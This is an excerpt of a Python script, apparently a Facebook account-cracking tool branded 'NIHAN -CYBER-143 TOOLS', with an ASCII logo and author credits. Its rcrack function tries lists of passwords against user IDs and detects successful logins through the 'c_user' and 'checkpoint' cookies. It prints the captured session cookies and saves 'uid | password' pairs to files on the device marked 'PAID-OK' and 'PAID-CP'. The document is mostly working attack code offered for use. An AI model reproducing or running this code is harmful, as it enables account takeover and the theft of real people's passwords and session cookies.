...
logo =("""\033[1;32m
NN   NN IIIII HH   HH   AAA   NN   NN 
NNN  NN  III  HH   HH  AAAAA  NNN  NN 
NN N NN  III  HHHHHHH AA   AA NN N NN 
NN  NNN  III  HH   HH AAAAAAA NN  NNN 
NN   NN IIIII HH   HH AA   AA NN   NN 
                                                                                                                                    
       ┌━━━━━━━━━━━━━━━━━ NIHAN ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  NIHAN VAI            
               \033[1;91mFACEBOK      :  PICCI NIHAN             
               \033[1;97mGITHUB       :  NIHAN-111       
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO NIHAN -CYBER-143 TOOLS🔥')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[NIHAN \033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[NIHAN -OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/NIHAN -PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[NIHAN -CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/NIHAN -PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[NIHAN -OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE 🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/SAMIR -PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
